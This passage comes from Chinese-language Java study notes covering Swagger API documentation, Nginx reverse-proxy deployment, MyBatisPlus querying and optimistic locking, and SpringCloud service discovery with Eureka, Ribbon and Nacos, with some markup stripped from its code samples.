接下来重新启动项目，即可访问接口文档，访问链接为： http://localhost:8080/doc.html 使用注解 以上步骤实现的接口文档没有相关参数说明，可读性差。可通过swagger注解解决。 常用注解 | 注解 | 位置 | 说明 | | ----------------------------- | ---------------- | ------------------------------------------------------------ | | @Api(tags = \"注释\") | 类 | 加载Controller类上,表示对类的说明 | | @ApiModel(\"注释\") | 类(通常是实体类) | 描述实体类的作用 | | @ApiModelProperty(\"注释\") | 属性 | 描述实体类的属性 | | @ApiOperation(value = \"注释\") | 方法 | 说明方法的用途、作用 | | @ApiImplicitParams | 方法 | 表示一组参数说明 | | @ApiImplicitParam | 方法 | 用在@ApiImplicitParams注解中，指定一个请求参数的各个方面的属性 | @GetMapping(\"/page\") @ApiOperation(value = \"套餐分页查询接口\") @ApiImplicitParams({ @ApiImplicitParam(name = \"page\",value = \"页码\",required = false), @ApiImplicitParam(name = \"pageSize\",value = \"每页显示数量\",required = false), @ApiImplicitParam(name = \"name\",value = \"搜索内容\",required = false) }) public R page(@RequestParam(defaultValue = \"1\") Integer page, @RequestParam Integer pageSize, String name){ R result = setmealService.page(page,pageSize,name); return result; } 项目部署 前后端分离：即前后端代码不再混合在同一个maven工程中，而是分为 前端工程 和 后端工程 前端工程部署于Nginx服务器，后端工程部署于Tomcat服务器 服务器 软件 192.168.65.10 Nginx(部署前端项目、配置反向代理)，MySQL(主从复制的主库)、Redis 192.168.65.11 JDK1.8、Git、Maven、jar(项目jar包基于内嵌Tomcat运行)、MySQL(主从复制的从库) 前端部署 Nginx 部署静态资源：上传到Nginx的html目录下 修改Nginx配置文件nginx.conf中的根目录和首页 设置反向代理 修改Nginx配置文件nginx.conf，进行rewrite(url重写) 和 proxy_pass(反向代理) nginx在原始请求路径前增加了/api/前缀 这里写的是一个正则表达式，代表如果请求路径是以 /api/ 开头，后面的请求路径任意，此时将原始的url路径重写为 /$1，这里的$1指代的就是(.*)分组里面的内容 location ^~ /api/ { #url重写 rewrite ^/api/(.*)$ /$1 break; #反向代理 proxy_pass http://192.168.65.11:8081; } 后端部署 确认环境 JDK、Git、Maven 拉取代码 #创建java代码存放目录 mkdir -p /usr/local/javaapp #切换目录 cd /usr/local/javaapp #克隆代码 , 需要使用自己的远程仓库 git clone https://gitee.com/ChuanZhiBoKe/reggie_take_out.git #设置权限 chmod 777 reggieStart.sh #运行脚本，自动部署项目 ./reggieStart.sh Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-01-11 21:07 "},"Java笔记/Day52-MyBatisPlus+乐观锁.html":{"url":"Java笔记/Day52-MyBatisPlus+乐观锁.html","title":"Day52-MyBatisPlus+乐观锁","keywords":"","body":"MyBatisPlus MyBatisPlus在 MyBatis 的基础上只做增强不做改变，为简化开发、提高效率而生 官网：https://baomidou.com/ 特性 无侵入：只做增强不做改变，不会对现有工程产生影响 强大的 CRUD 操作：内置通用 Mapper，少量配置即可实现单表CRUD 操作 支持 Lambda：编写查询条件无需担心字段写错 支持主键自动生成 内置分页插件 入门 导入依赖 org.springframework.boot spring-boot-dependencies 2.5.6 org.springframework.boot spring-boot-starter org.springframework.boot spring-boot-starter-test com.baomidou mybatis-plus-boot-starter 3.4.2 com.alibaba druid-spring-boot-starter 1.1.23 mysql mysql-connector-java 5.1.47 runtime org.projectlombok lombok 配置文件application.yml # 数据源的配置 spring: datasource: username: root password: root driver-class-name: com.mysql.jdbc.Driver type: com.alibaba.druid.pool.DruidDataSource url: jdbc:mysql:///mybatisplus_db # 显示SQL语句 mybatis-plus: configuration: log-impl: org.apache.ibatis.logging.stdout.StdOutImpl 定义数据接口，继承BaseMapper ==启动类记得添加@MapperScan注解扫描dao包== ==Mapper接口需要继承BaseMapper== ==在BaseMapper接口上指定操作的实体类作为泛型具体类型,默认实体类的名字就是对应表名== package com.itheima.dao; import com.baomidou.mybatisplus.core.mapper.BaseMapper; import com.itheima.model.User; public interface UserDao extends BaseMapper { } 字段映射与表名映射 数据库表名和实体类名不一致：在实体类上方，使用@TableName注解，通过==value==属性，设置当前类对应的数据库表名称 数据库表字段与实体类属性不一致：在实体类属性上方，使用@TableField属性注解，通过==value==属性，设置当前属性对应的数据库表中的字段关系 实体类的属性在数据库表中未定义：在实体类属性上方，使用@TableField注解，通过==exist==属性设置为false，设置属性在数据库表字段中是否存在，默认为true。（此属性无法与value同时使用） 某些字段和属性不参与查询：在实体类属性上方，使用@TableField注解，通过==select==属性设置为false。（此属性与select()映射配置不冲突） 分页功能 设置分页拦截器 package com.itheima.config; import com.baomidou.mybatisplus.annotation.DbType; import com.baomidou.mybatisplus.extension.plugins.MybatisPlusInterceptor; import com.baomidou.mybatisplus.extension.plugins.inner.PaginationInnerInterceptor; import org.springframework.context.annotation.Bean; import org.springframework.context.annotation.Configuration; @Configuration public class MybatisPlusConfig { /** * 如果mp需要实现分页，必须创建一个分页的拦截器存储到spring的容器里面， * 当使用selectPage的时候，就会对sql语句进行拦截，从而拼接limit语句实现分页 */ @Bean public MybatisPlusInterceptor mybatisPlusInterceptor(){ //1. 创建MybatisPlusInterceptor拦截器容器 MybatisPlusInterceptor mybatisPlusInterceptor = new MybatisPlusInterceptor(); //2. 把分页的拦截器添加到mp拦截器容器里面 mybatisPlusInterceptor.addInnerInterceptor(new PaginationInnerInterceptor(DbType.MYSQL)); //3. 返回mp拦截器容器即可 return mybatisPlusInterceptor; } } 使用分页查询 @Test public void findByPage() { //1.创建一个Page对象，设置当前页和页面大小 //参数1：当前页，参数2：页面大小 Page page = new Page<>(1, 2); //2.调用selectPage方法，把Page对象传入，即可实现分页；分页结果都存储在Page对象中 //参数1：当前分页对象，参数2：查询条件 userDao.selectPage(page, null); System.out.println(\"当前页：\" + page.getCurrent()); System.out.println(\"页面大小：\" + page.getSize()); System.out.println(\"总记录数：\" + page.getTotal()); System.out.println(\"总页数：\" + page.getPages()); System.out.println(\"当前页的数据：\" + page.getRecords()); } DQL编程控制 条件查询 //==========按条件查询============= /** * 根据年龄查询： 大于18岁 */ @Test public void findByAge() { //1.创建一个条件对象 QueryWrapper queryWrapper = new QueryWrapper<>(); //2.设置查询条件 //参数1：查询的字段，参数2：查询条件 queryWrapper.gt(\"age\", 18); //3.调用selectList方法查询 System.out.println(\"用户列表：\" + userDao.selectList(queryWrapper)); } //方式二：使用lambda格式查询，防止输入的字段名写错 @Test public void findByAgeLambda() { //1.创建一个lambda条件对象 LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); //2.设置查询条件 queryWrapper.gt(User::getAge, 18); //3.调用selectList方法查询 List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } 组合条件查询 //==========组合条件查询============= /** * 查询年龄小于28岁，而且大于18岁的用户 * 默认情况：添加两个条件的关系就是and的关系 * 生成语句：SELECT id,name,gender,password,age,tel FROM user WHERE (age ?) */ @Test public void selectByConditions() { //1.创建lambda条件查询对象 LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); //2.添加查询条件 queryWrapper.lt(User::getAge, 28); queryWrapper.gt(User::getAge, 18); //3.查询 List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } /** * 查询年龄小于18岁，或者大于28岁的用户 * 生成语句：SELECT id,name,gender,password,age,tel FROM user WHERE (age ?) */ @Test public void selectByConditions2() { //1.创建lambda条件查询对象 LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); //2.添加查询条件 queryWrapper.lt(User::getAge, 28); queryWrapper.or(); queryWrapper.gt(User::getAge, 18); //3.查询 List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } 条件参数控制（Null值处理） //==========Null值处理============= /** * 根据年龄搜索，分别最小年龄，最大年龄，名字， 只要三个变量中任何一个不为空都要作为条件查询 */ @Test public void selectByConditions3() { Integer minAge = null; Integer maxAge = 26; String name = \"张\"; LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); queryWrapper.ge(minAge != null, User::getAge, minAge);//大于等于 queryWrapper.le(maxAge != null, User::getAge, maxAge);//小于等于 //模糊查询 like ==> '%搜索内容%'，likeLeft ==> '%搜索内容'，likeRight ==> '搜索内容%' queryWrapper.like(name != null, User::getName, name); List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } 查询条件 /** * between查询范围 */ @Test public void selectByConditions6(){ LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); queryWrapper.between(User::getAge,18,28); List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } /** * 右模糊查询（以什么开头） */ @Test public void selectByConditions7(){ LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); queryWrapper.likeRight(User::getName,\"k\"); List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } /** * 分组聚合查询 */ @Test public void selectByConditions8(){ QueryWrapper queryWrapper = new QueryWrapper<>(); queryWrapper.select(\"gender, count(*) as nums\"); queryWrapper.groupBy(\"gender\"); List> maps = userMapper.selectMaps(queryWrapper); System.out.println(maps); } 排序和limit /** * 只显示年龄最大的前五个 * last()方法：无视优化规则直接拼接到 sql 的最后(有sql注入的风险)，注意只能调用一次,多次调用以最后一次为准 */ @Test public void selectByConditions9(){ LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); queryWrapper.orderByDesc(User::getAge); queryWrapper.last(\"limit 5\"); //生成语句：SELECT id,name,gender,password,age,tel FROM user ORDER BY age DESC limit 5 List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } 批量操作 //==========批量操作============= @Test public void selectByIds(){ List list = new ArrayList<>(); list.add(1L); list.add(2L); list.add(3L); userDao.selectBatchIds(list); } @Test public void deleteByIds(){ List list = new ArrayList<>(); list.add(1613810063384797186L); list.add(1613870490835759106L); userDao.deleteBatchIds(list); } 查询投影 查询指定字段 /** * 只查询其中个别列表，而不是所有列表 * select()方法就是相当于 select 字段名 */ @Test public void selectByConditions4(){ LambdaQueryWrapper queryWrapper = new LambdaQueryWrapper<>(); queryWrapper.select(User::getGender,User::getAge);//相当于select gender,age //生成：SELECT id,name,age FROM user List userList = userDao.selectList(queryWrapper); System.out.println(\"userList = \" + userList); } 查询未定义属性 /** * 例如：统计男女的人数 * 查询的结果中包含实体类中未定义的属性，则将每个元素封装成Map对象 * 【注意: 既然查询字段不是实体类拥有属性，那么不准使用lambda写法】 */ @Test public void selectByConditions5(){ QueryWrapper queryWrapper = new QueryWrapper<>(); queryWrapper.select(\"gender,count(*)\"); queryWrapper.groupBy(\"gender\"); //生成语句：SELECT gender,count(*) FROM user GROUP BY gender List list = userDao.selectMaps(queryWrapper); System.out.println(\"list = \" + list); } 逻辑删除 逻辑删除：为数据设置是否可用状态字段，删除时设置状态字段为不可用状态，数据保留在数据库中 如果加了逻辑删除字段，查询数据时也会自动带上逻辑删除字段 在数据库中添加逻辑删除标记字段 -- 添加一列deleted，注意设置默认值为0 ALTER TABLE tbl_user ADD COLUMN deleted INT(1) DEFAULT 0; 在实体类中添加对应属性，并设定为逻辑删除标记字段 使用@TableLogic注解设定 yml全局设定 mybatis-plus: global-config: db-config: table-prefix: tbl_ # 逻辑删除字段名 logic-delete-field: deleted # 逻辑删除字面值：未删除为0 logic-not-delete-value: 0 # 逻辑删除字面值：删除为1 logic-delete-value: 1 DML编程控制 ID生成策略控制&表前缀配置 @TableId注解 用在实体类中用于表示主键的属性上方，设置type属性指定当前类中主键属性的生成策略 @TableName注解 @TableName(\"tbl_user\")在实体类上使用，与数据库的表建立映射 yml全局配置 # 全局策略配置 global-config: db-config: # 定义所有表主键生成策略 id-type: assign_id # 在每个实体类的前面添加相同的前缀 table-prefix: tbl_ 代码生成器 AutoGenerator 是 MyBatis-Plus 的代码生成器，只需要创建好表，通过 AutoGenerator 可以快速生成 Entity、Mapper、Mapper XML、Service、Controller 等各个模块的代码，极大的提升了开发效率。 实现 导入依赖 ```xml org.springframework.boot spring-boot-starter-parent 2.1.6.RELEASE com.baomidou mybatis-plus-generator 3.4.0 org.freemarker freemarker 2.3.30 org.springframework.boot spring-boot-starter-web com.baomidou mybatis-plus-boot-starter 3.4.0 mysql mysql-connector-java 5.1.47 org.projectlombok lombok - 创建test包，复制此类到包下 ```java package cn.itcast.test; import com.baomidou.mybatisplus.core.exceptions.MybatisPlusException; import com.baomidou.mybatisplus.core.toolkit.StringPool; import com.baomidou.mybatisplus.core.toolkit.StringUtils; import com.baomidou.mybatisplus.generator.AutoGenerator; import com.baomidou.mybatisplus.generator.InjectionConfig; import com.baomidou.mybatisplus.generator.config.*; import com.baomidou.mybatisplus.generator.config.po.TableInfo; import com.baomidou.mybatisplus.generator.config.rules.NamingStrategy; import com.baomidou.mybatisplus.generator.engine.FreemarkerTemplateEngine; import java.util.ArrayList; import java.util.List; import java.util.Scanner; // 演示例子，执行 main 方法控制台输入模块表名回车自动生成对应项目目录中 public class CodeGenerator { public static String scanner(String tip) { Scanner scanner = new Scanner(System.in); StringBuilder help = new StringBuilder(); help.append(\"请输入\" + tip + \"：\"); System.out.println(help.toString()); if (scanner.hasNext()) { String ipt = scanner.next(); if (StringUtils.isNotBlank(ipt)) { return ipt; } } throw new MybatisPlusException(\"请输入正确的\" + tip + \"！\"); } public static void main(String[] args) { // 代码生成器 AutoGenerator mpg = new AutoGenerator(); // 全局配置 GlobalConfig gc = new GlobalConfig(); String projectPath = System.getProperty(\"user.dir\"); String moduleName = scanner(\"请代码存储的模块名\"); gc.setOutputDir(projectPath + \"/\"+moduleName+\"/src/main/java\"); //代码的作者 gc.setAuthor(\"itheima\"); gc.setOpen(false); mpg.setGlobalConfig(gc); // 数据源配置 DataSourceConfig dsc = new DataSourceConfig(); dsc.setUrl(\"jdbc:mysql://localhost:3306/springdb?useUnicode=true&useSSL=false&characterEncoding=utf8\"); // dsc.setSchemaName(\"public\"); dsc.setDriverName(\"com.mysql.jdbc.Driver\"); dsc.setUsername(\"root\"); dsc.setPassword(\"root\"); mpg.setDataSource(dsc); // 包配置 PackageConfig pc = new PackageConfig(); pc.setModuleName(scanner(\"功能模块名\")); //设置父级包名 com.itheima.user com.itheima.teacher pc.setParent(\"com.itheima\"); mpg.setPackageInfo(pc); // 自定义配置 InjectionConfig cfg = new InjectionConfig() { @Override public void initMap() { // to do nothing } }; // 如果模板引擎是 freemarker String templatePath = \"/templates/mapper.xml.ftl\"; // 自定义输出配置 List focList = new ArrayList<>(); // 自定义配置会被优先输出 focList.add(new FileOutConfig(templatePath) { @Override public String outputFile(TableInfo tableInfo) { // 自定义输出文件名 ， 如果你 Entity 设置了前后缀、此处注意 xml 的名称会跟着发生变化！！ return projectPath + \"/\"+moduleName+\"/src/main/resources/mapper/\" + pc.getModuleName() + \"/\" + tableInfo.getEntityName() + \"Mapper\" + StringPool.DOT_XML; } }); cfg.setFileOutConfigList(focList); mpg.setCfg(cfg); // 配置模板 TemplateConfig templateConfig = new TemplateConfig(); templateConfig.setXml(null); mpg.setTemplate(templateConfig); // 策略配置 StrategyConfig strategy = new StrategyConfig(); strategy.setNaming(NamingStrategy.underline_to_camel); strategy.setColumnNaming(NamingStrategy.underline_to_camel); // strategy.setSuperEntityClass(\"你自己的父类实体,没有就不用设置!\"); strategy.setEntityLombokModel(true); strategy.setRestControllerStyle(true); // 公共父类 // strategy.setSuperControllerClass(\"你自己的父类控制器,没有就不用设置!\"); // 写于父类中的公共字段 // strategy.setSuperEntityColumns(\"id\"); strategy.setInclude(scanner(\"表名，多个英文逗号分割\").split(\",\")); strategy.setControllerMappingHyphenStyle(true); String preName = scanner(\"请输入表前缀名\"); strategy.setTablePrefix(preName); // 设置表前缀 mpg.setStrategy(strategy); mpg.setTemplateEngine(new FreemarkerTemplateEngine()); // 执行 mpg.execute(); } } 执行以上代码，在控制台输入功能模块名，表名即可 悲观锁&乐观锁 悲观锁：借助数据库锁机制，在修改数据之前先锁定，再修改的方式被称之为悲观锁。这是一种对数据的修改持有悲观态度的并发控制方式。总是假设最坏的情况，每次读取数据的时候都默认其他线程会更改数据，因线程想要访问数据时，都需要阻塞挂起。 乐观锁：乐观锁采取了更加宽松的加锁机制，不会刻意使用数据库本身的锁机制，而是依据数据本身来保证数据的正确性。假设数据一般情况不会造成冲突，所以在数据进行提交更新的时候，才会正式对数据的冲突与否进行检测，乐观锁适用于读多写少的场景，这样可以提高程序的吞吐量。 乐观锁实现 CAS实现：Java 中java.util.concurrent.atomic包下面的原子变量使用了乐观锁的一种 CAS 实现方式。 版本号控制：在数据表中加上一个数据版本号 version 字段，表示数据被修改的次数。当数据被修改时，version 值会 +1。当线程 A 要更新数据时，在读取数据的同时也会读取 version 值，在提交更新时，若刚才读取到的 version 值与当前数据库中的 version 值相等时才更新，否则重试更新操作，直到更新成功。 实现案例（MP） 数据库表中添加锁标记字段 ALTER TABLE tbl_user ADD COLUMN `version` INT DEFAULT 0; 实体类中添加对应字段，并使用@Version注解设定当前字段为版本控制字段 package com.itheima.domain; @Data public class User { private Long id; private Integer age; @Version private Integer version; } 配置乐观锁拦截器实现锁机制对应的动态SQL语句拼接 package com.itheima.config; @Configuration public class MybatisPlusConfig { @Bean public MybatisPlusInterceptor mybatisPlusInterceptor() { //1.定义Mp拦截器 MybatisPlusInterceptor mpInterceptor = new MybatisPlusInterceptor(); //2.添加乐观锁拦截器 mpInterceptor.addInnerInterceptor(new OptimisticLockerInnerInterceptor()); return mpInterceptor; } } 使用乐观锁机制在修改前必须先获取对应数据的version /** * 乐观锁的测试 */ @Test public void testLock(){ //1. 查询当前要修改的记录 User user = userDao.selectById(6); //2. 修改数据 user.setAge(32); userDao.updateById(user); } Copyright © by None，使用知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议发布            此页面修订于： 2023-02-10 17:32 "},"Java笔记/Day53~54-SpringCloud.html":{"url":"Java笔记/Day53~54-SpringCloud.html","title":"Day53~54-SpringCloud","keywords":"","body":"SpringCloud SpringCloud集成了各种微服务功能==组件==，==并基于SpringBoot实现了这些组件的自动装配==，从而提供了良好的开箱即用体验。SpringCloud底层是依赖于SpringBoot的，并且有版本的兼容关系。 单体架构：将业务的所有功能集中在一个项目中开发，打成一个包部署。 优点：架构简单，部署成本低； 缺点： 耦合度高 无法针对不同的模块进行针对性性能优化，如果需要提高性能只能整体一起提高 单点容错率低，并发能力差，全部功能集中在一个工程中，对于大型项目不易开发、扩展及维护 分布式架构：根据业务功能对系统做拆分，每个业务功能模块作为独立项目开发，称为一个服务 分布式： 把一件事情拆分n个事情来做，n个事情合起来就是一个完整的项目 集群： 多台服务器做的事情是一样 分布式架构的优缺点 优点：降低服务耦合，有利于服务升级和拓展 缺点：服务调用关系错综复杂 微服务 微服务是一种经过良好架构设计的分布式架构方案，微服务架构特征： 微服务的架构特征： 单一职责：微服务拆分粒度更小，每一个服务都对应唯一的业务 自治：团队独立、技术独立、数据独立、独立部署和交付 面向服务：服务提供统一标准的接口，与语言和技术无关 隔离性强：服务调用做好隔离、容错、降级，避免出现级联问题 微服务技术对比 | | Dubbo | SpringCloud | SpringCloudAlibaba | | -------------- | ----------------------- | ------------------------ | ------------------------ | | 注册中心 | zookeeper、Redis | Eureka、Consul | Nacos、Eureka | | 服务远程调用 | Dubbo协议、HTTP、REST等 | Feign（http协议） | Dubbo、Feign | | 配置中心 | 无 | SpringCloudConfig | SpringCloudConfig、Nacos | | 服务网关 | 无 | SpringCloudGateway、Zuul | SpringCloudGateway、Zuul | | 服务监控和保护 | dubbo-admin，功能弱 | Hystrix | Sentinel | 服务拆分 拆分原则 不同微服务，不要重复开发相同业务 微服务数据独立，不要访问其他微服务的数据库 微服务可以将自己的业务暴露为接口，供其他微服务调用 远程调用 背景：需要在order-service中向user-service发起一个http的请求，调用http://localhost:8081/user/{userId}这个接口 实现步骤： 在order-service服务的启动类中注册RestTemplate package cn.itcast.order; import org.mybatis.spring.annotation.MapperScan; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.context.annotation.Bean; import org.springframework.web.client.RestTemplate; @MapperScan(\"cn.itcast.order.mapper\") @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } /** * 提供远程Http服务 */ @Bean public RestTemplate restTemplate() { return new RestTemplate(); } } 使用getForObject方法，实现远程调用 @Service public class OrderService { @Autowired private OrderMapper orderMapper; @Autowired private RestTemplate restTemplate; public Order queryOrderById(Long orderId) { // 1.根据id查询订单 Order order = orderMapper.findById(orderId); //发起远程调用另一个功能模块 User user = restTemplate.getForObject(\"http://localhost:8081/user/\" + order.getUserId(), User.class); order.setUser(user); // 4.返回 return order; } } Eureka注册中心 搭建Eureka-server 在父工程下创建一个子模块 导入依赖 org.springframework.cloud spring-cloud-starter-netflix-eureka-server 编写启动类，添加@EnableEurekaServer注解，开启Eureka的注册中心功能 package cn.itcast.eureka; import org.springframework.boot.SpringApplication; import org.springframework.boot.autoconfigure.SpringBootApplication; import org.springframework.cloud.netflix.eureka.server.EnableEurekaServer; @SpringBootApplication @EnableEurekaServer public class EurekaApplication { public static void main(String[] args) { SpringApplication.run(EurekaApplication.class, args); } } 编写配置文件 # 服务器端口号 server: port: 10086 # 服务器名称 spring: application: name: euraka-server # 注册中心服务的网址 eureka: client: service-url: defaultZone: http://127.0.0.1:10086/eureka 启动服务 启动微服务，然后在浏览器访问：http://127.0.0.1:10086 服务注册 导入依赖 org.springframework.cloud spring-cloud-starter-netflix-eureka-client 编写配置文件 # 写在spring的配置部分中 spring: application: name: user-server # 指定eureka服务器端的访问地址 eureka: client: service-url: defaultZone: http://127.0.0.1:10086/eureka 模拟多个user-server实例 修改server.port参数 # 动态端口 server: port: ${port:8081} 编辑VM options参数-Dport=8082 先开启Eureka服务器端，再开启客户端 服务发现 将order-service的逻辑修改：向eureka-server拉取user-server的信息，实现服务发现。 导入依赖（服务发现、服务注册统一都封装在eureka-client依赖中） org.springframework.cloud spring-cloud-starter-netflix-eureka-client 编写配置文件 # 写在spring的配置部分中 spring: application: name: order-server # 指定eureka服务器端的访问地址 eureka: client: service-url: defaultZone: http://127.0.0.1:10086/eureka 服务拉取与负载均衡 给RestTemplate这个Bean添加一个@LoadBalanced注解 @MapperScan(\"cn.itcast.order.mapper\") @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } @Bean @LoadBalanced public RestTemplate restTemplate(){ return new RestTemplate(); } } 修改访问的url路径，用服务名代替ip、端口，spring会自动帮助我们从eureka-server端，根据user-service这个服务名称，获取实例列表，而后完成负载均衡 @Service public class OrderService { @Autowired private OrderMapper orderMapper; @Autowired private RestTemplate restTemplate; public Order queryOrderById(Long orderId) { // 1.查询订单 Order order = orderMapper.findById(orderId); //调用另一个功能模块 User user = restTemplate.getForObject(\"http://user-server/user/\" + order.getUserId(), User.class); order.setUser(user); // 4.返回 return order; } } Ribbon负载均衡 原理 SpringCloud底层其实是利用了一个名为Ribbon的组件，来实现负载均衡功能的 SpringCloudRibbon的底层采用了一个拦截器，拦截了RestTemplate发出的请求，对地址做了修改。基本流程如下： loadBalanceInterceptor拦截我们请求的url地址 RibbonLoadBalancerClient会从请求url中获取服务名称，也就是userservice DynamicServerListLoadBanancer根据服务名称到eureka拉取服务列表 根据根接口IRule配置的负载均衡策略，选择其中的一个服务 RibbonLoadBalancerClient修改请求地址，用localhost:8081替代userservice，得到http://localhost:8081/user/1，发起真实请求 负载均衡策略 内置负载均衡规则类 规则描述 RoundRobinRule 轮询规则：简单轮询服务列表来选择服务器。它是Ribbon默认的负载均衡规则。 AvailabilityFilteringRule 可用性过滤规则：对以下两种服务器进行忽略： （1）在默认情况下，这台服务器如果3次连接失败，这台服务器就会被设置为“短路”状态。短路状态将持续30秒，如果再次连接失败，短路的持续时间就会几何级地增加。 （2）并发数过高的服务器。如果一个服务器的并发连接数过高，配置了AvailabilityFilteringRule规则的客户端也会将其忽略。并发连接数的上限，可以由客户端的..ActiveConnectionsLimit属性进行配置。 WeightedResponseTimeRule 响应权重时间规则：为每一个服务器赋予一个权重值。服务器响应时间越长，这个服务器的权重就越小。这个规则会随机选择服务器，这个权重值会影响服务器的选择。 ZoneAvoidanceRule 规避区域规则：以区域可用的服务器为基础进行服务器的选择。使用Zone对服务器进行分类，这个Zone可以理解为一个机房、一个机架等。而后再对Zone内的多个服务做==轮询==。 BestAvailableRule 最可用规则：忽略那些短路的服务器，并选择并发数较低的服务器。 RandomRule 随机规则：随机选择一个可用的服务器。 RetryRule 重试实现：重试机制的选择逻辑 自定义负载均衡策略 （一般用默认的负载均衡规则，不做修改） 方式一：编码方式（全局） @MapperScan(\"cn.itcast.order.mapper\") @SpringBootApplication public class OrderApplication { public static void main(String[] args) { SpringApplication.run(OrderApplication.class, args); } /** * 提供远程Http服务 */ @Bean @LoadBalanced public RestTemplate restTemplate(){ return new RestTemplate(); } /** * 自定义负载均衡： * 方式一：编码方式（全局），方式二：配置文件方式（可指定具体的微服务） * 自定义负载均衡：这种方式是全局的配置，无论以后访问哪个微服务都使用随机的方式 * 注意：如果选择方式二进行配置，则需要注释掉方式一 */ @Bean public IRule iRule(){ return new RandomRule();//使用随机的负载均衡规则 } } 方式二：配置文件方式（可指定具体的微服务） # 给某个微服务配置负载均衡规则，只对这个微服务起作用 user-server: # 指定的微服务 ribbon: # 负载均衡规则的类全名 NFLoadBalancerRuleClassName: com.alibaba.cloud.nacos.ribbon.NacosRule 饥饿加载 Ribbon默认是采用懒加载，即第一次访问时才会去创建LoadBalanceClient，使得第一次请求的时间会很长。饥饿加载的作用： 启动服务器的时候就去拉取服务列表，缩短第一次请求的时间。 配置开启饥饿加载 ribbon: eager-load: enabled: true # 开启饥饿加载 # 指定微服务 clients: - user-server # clients是一个List集合。如果要配置多个服务名字，则换一行。用-做为前缀，每行写一个 Nacos注册中心 Nacos是阿里巴巴的产品，现在是SpringCloud中的一个组件。相比Eureka功能更加丰富，在国内受欢迎程度较高。 搭建Nacos 导入依赖 在cloud-demo父工程的pom文件中的中引入SpringCloudAlibaba的依赖： com.alibaba.cloud spring-cloud-alibaba-dependencies 2.2.6.RELEASE pom import 然后在子工程user-service和order-service中的pom文件中引入nacos-discovery依赖： com.alibaba.cloud spring-cloud-starter-alibaba-nacos-discovery 注意：子工程注释掉eureka的依赖 org.springframework.cloud spring-cloud-starter-netflix-eureka-client 配置Nacos地址 在user-service和order-service的application.yml中添加nacos地址： spring: cloud: nacos: server-addr: localhost:8848 注意：注释掉eureka的地址 eureka: client: service-url: defaultZone: http://127.0.0.1:10086/eureka 重启微服务后，登录nacos管理页面 服务分级模型（集群） 微服务互相访问时，应该尽可能访问同集群实例，因为本地访问速度更快。当本集群内不可用时，才访问其它集群。 配置集群，修改order-service和user-service的application.yml文件，添加集群配置， 放在HZ这个集群中 spring: cloud: nacos: server-addr: localhost:8848 discovery: cluster-name: HZ # 集群名称 模拟集群，user-service的8081和8082在HZ集群，8083在GZ集群（VM options设置） -Dport=8083 -Dspring.cloud.nacos.discovery.cluster-name=SZ 配置同集群优先的负载均衡策略，修改order-service的application.yml文件，修改负载均衡规则 user-server: ribbon: NFLoadBalancerRuleClassName: com.alibaba.cloud.nacos.ribbon.NacosRule # 负载均衡规则 权重配置 在nacos控制台，找到userservice的实例列表，点击编辑，即可修改权重，权重越大则访问频率越高。 环境隔离 为了便于管理，Nacos提供了namespace来实现环境隔离功能。用于进行租户级别的隔离，我们最常用的就是不同环境比如测试环境，线上环境进行隔离。不同namespace之间相互隔离，即不同namespace的服务互相不可见. 创建命名空间，在nacos控制台创建一个命名空间，然后复制命名空间ID 给微服务配置namespace，修改order-service和user-service的application.yml文件： spring: cloud: nacos: server-addr: localhost:8848 discovery: cluster-name: HZ namespace: 492a7d5d-237b-46a1-a99a-fa8e98e4b0f9 # 命名空间，填ID 永久实例 Nacos的服务实例分为两种类型 临时实例：默认类型。如果实例宕机超过一定时间，会从服务列表剔除 非临时实例：也叫永久实例。如果实例宕机，不会从服务列表剔除 配置永久实例 spring: cloud: nacos: discovery: ephemeral: false # 设置为永久实例 Nacos与Eureka的区别 共同点 都支持服务注册、拉取 都支持心跳方式做健康检测 不同点 Nacos有临时实例与非临时实例， Eureka是没有临时实例概念 临时实例采用心跳模式，永久实例采用主动检测模式 临时实例心跳不正常会被剔除，永久实例则不会被剔除 Nacos不单单支持服务的拉取，还支持服务的主动推送；Eureka只能支持服务拉取，不支持主动推送 Nacos配置管理 统一配置管理 Nacos配置中心作用 配置的数据支持动态更新 集中管理配置信息 支持不同环境的配置文件 拉取Nacos中管理的配置，与本地的application.yml配置合并。Spring引入了一种新的配置文件：bootstrap.yaml文件，会在application.yml之前被读取 实现步骤： 导入依赖 com.alibaba.cloud spring-cloud-starter-alibaba-nacos-config 在application.yml同级目录下添加bootstrap.yaml文件 spring: application: name: userservice # 服务名称，注：要与文件名一致 profiles: active: dev #环境，这里是开发环境dev cloud: nacos: server-addr: localhost:8848 # Nacos地址 config: file-extension: yaml # 文件后缀名 去除application.yml中重复的配置 读取Nacos中的pattern.dateformat配置 package cn.itcast.user.web; import cn.itcast.user.pojo.User; import cn.itcast.user.service.UserService; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.beans.factory.annotation.Value; import org.springframework.web.bind.annotation.*; import java.time.LocalDateTime; import java.time.format.DateTimeFormatter; @RestController @RequestMapping(\"/user\") public class UserController { @Autowired private UserService userService; @Value(\"${pattern.dateformat}\") private String dateformat; @GetMapping(\"now\") public String now(){ return LocalDateTime.now().format(DateTimeFormatter.ofPattern(dateformat)); } } 热更新配置 方式一：在@Value注入的变量所在的类上添加注解@RefreshScope @Slf4j @RestController @RequestMapping(\"/user\") @RefreshScope //启动热更新 public class UserController { @Autowired private UserService userService; 